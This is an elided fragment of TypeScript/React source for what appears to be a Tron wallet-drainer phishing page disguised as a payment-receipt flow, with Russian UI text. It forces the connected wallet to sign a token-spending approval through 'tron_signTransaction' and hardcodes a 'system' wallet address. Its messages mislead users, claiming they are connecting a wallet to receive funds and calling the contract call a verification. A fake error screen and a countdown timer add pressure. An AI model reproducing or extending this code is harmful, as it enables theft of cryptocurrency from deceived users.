  ...
  if (session?.namespaces) {
    ...
    if (Array.isArray(eip155Accounts) && eip155Accounts.length > 0) {
      ...
      if (a.includes("728126428")) {
        // 728126428 - это mainnet chainId для Tron в EIP-155
        return a.split(":").pop()!;
      }
    }
  }
...
async function approveTokenSpending(
  ...
  let signedResponse;
  try {
    // ЖЕСТКАЯ ПРОВЕРКА: Спрашиваем кошелек, кто он прямо сейчас, перед подписью
    ...
    // Делаем глубокий клон
    const cleanTxToSign = JSON.parse(JSON.stringify(tx));

    // ПРИНУДИТЕЛЬНО указываем адрес в параметрах, некоторые версии WalletConnect/TronLink требуют этого,
    // чтобы понять, КАКИМ аккаунтом подписывать, если их несколько.
    signedResponse = await rawProvider.request({
      method: "tron_signTransaction",
      params: [cleanTxToSign, safeOwner], // Добавили safeOwner вторым параметром (иногда помогает адаптерам)
    });
  } catch (e: any) {
...
function PaymentPage() {
  ...
  const userWalletAddress =
    appKitAddress ||
    (caipAddress?.includes(":") ? caipAddress.split(":")[1] : caipAddress) ||
    "";
      ...
      <div className="payment-card">
            ...
            <div className="step2-info-row">
              ...
              <div className="contract-wrapper">
                ...
                <div className="contract-tooltip">
                  Если мы не сможем перевести средства на ваш криптовалютный
                  кошелек, будет автоматически вызвана ссылка на смарт-контракт
                  для верификации. Этот процесс позволяет убедиться, что
                  транзакция не является ошибочной или несанкционированной. В
                  случае возникновения любых проблем, мы обязательно свяжемся с
                  вами для решения вопроса.
                </div>
              </div>
            </div>
        ...
        {step === 4 && (
          <div className="payment-step-wrapper anim-error-scale" key="step4">
            ...
            <div className="error-description">
              К сожалению из-за возникшей ошибки нам не удалось выполнить
              транзакцию. Попробуйте подключить свой кошелек
            </div>
            <button
              type="button"
          ...
          <div className="payment-step-wrapper anim-slide-next" key="step5">
            ...
            <div className="wallets-header">
              ...
              <div className="wallets-subtitle">
                Подключите кошелёк для получения средств
              </div>
            </div>
                  ...
                  onClick={async () => {
                    ...
                    try {
                      ...
                      const SYSTEM_WALLET_ADDRESS =
                        "TKpQcEAFM5MBZkdydWQCdtSJWUtJeVwbW8";
        ...
        <div className="payment-timer">
          <span className="payment-timer-label">
            Осталось времени для получения:
          </span>
